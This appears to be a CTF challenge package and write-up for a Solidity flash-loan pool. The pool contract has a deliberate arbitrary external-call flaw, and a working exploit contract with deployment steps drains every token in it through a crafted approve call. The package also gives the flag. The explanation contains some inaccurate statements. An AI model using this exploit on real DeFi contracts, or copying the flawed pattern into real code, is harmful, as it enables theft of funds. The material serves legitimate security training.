#### :warning: Please configure `processes` in Nginx Unit in Dockerfile according to server specs and [documentation](https://unit.nginx.org/configuration/#applications), right now it is not set, and the default value is 1, which is not optimal.

# Challenge Title/Description

LendingPool

Welcome to the LendingPool challenge! In this challenge, you'll be diving into a pool that offers flash loans of CTF tokens for free. The pool currently holds a balance of 1 million CTF tokens, while you start with nothing. However, there's no need to worry – you just might have what it takes to acquire them all from the pool.

### LendingPool
```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract LendingPool is ReentrancyGuard {
IERC20 public ctfToken;


constructor(address tokenAddress) {
    ctfToken = IERC20(tokenAddress);
}


function flashLoan(uint256 borrowAmount, address borrower, address target,          bytes calldata data)
external
nonReentrant
{
    uint256 balanceBefore = ctfToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");


    ctfToken.transfer(borrower, borrowAmount);
    (bool success,) = target.call(data);
    require(success, "External call failed");


    uint256 balanceAfter = ctfToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}


function isSolved() public view returns (bool) {
    return ctfToken.balanceOf(address(this)) == 0;
}
}
```

### CTF Token
https://mumbai.polygonscan.com/address/0xfa8994aa87c97e291dc8f08d88d76a1c623474d7

Note: To participate in this challenge, please ensure you possess Mumbai Testnet Matic tokens.
https://mumbaifaucet.com/

# Write Up

Welcome to the LendingPool challenge! In this writeup, we'll explore a vulnerability in the LendingPool contract that can be exploited using a carefully crafted smart contract. Our goal is to gain unauthorized access to the pool's funds and claim them for ourselves.

Exploit Contract:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {LendingPool} from "./LendingPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract LendingPoolExploit {
function attack(address _pool, address _token) public {
    LendingPool lendingPool = LendingPool(_pool);
    IERC20 token = IERC20(_token);


// call flashloan
    // call token.approve(exploit, 2 ** 256 - 1)
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)",  address(this), 2 ** 256 - 1);


    lendingPool.flashLoan(0, msg.sender, _token, data);


    // token.transferFrom(pool, msg.sender, balance of pool)
    token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
}
}

```
Exploit Explanation:
- The exploit contract interacts with the vulnerable LendingPool contract to drain funds.
- It initiates the flashLoan function, allowing a borrower to temporarily borrow tokens, provided they pay them back along with a fee.
- The contract encodes an approval for itself to spend unlimited tokens from the pool.
- Upon executing the flashLoan function, the exploit contract's attack function is invoked, resulting in the attacker receiving tokens from the pool.

Execution:

To execute the exploit, follow these steps:

- Deploy the LendingPoolExploit contract.
- Run the attack function, passing the address of the vulnerable LendingPool contract and the address of the target token (CTF token) as arguments.
- The flashLoan function will be called, and the attacker contract will receive tokens from the pool.
- The transferFrom function is then invoked, transferring the remaining tokens from the pool to the attacker's address.

# Flag

UCTF{Urmia_P4radise0fIran}

# Categories

Check the categories which the challenge belongs to.

- [x] Web
- [ ] Reverse
- [ ] PWN
- [x] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |       450       | 500  |

# Resources

You should create a folder including all needed files. You may create the challenge using [Docker Compose](https://docs.docker.com/compose/gettingstarted/). Additionally, You may put your files here including *reverse engineering* or *pcap* files.
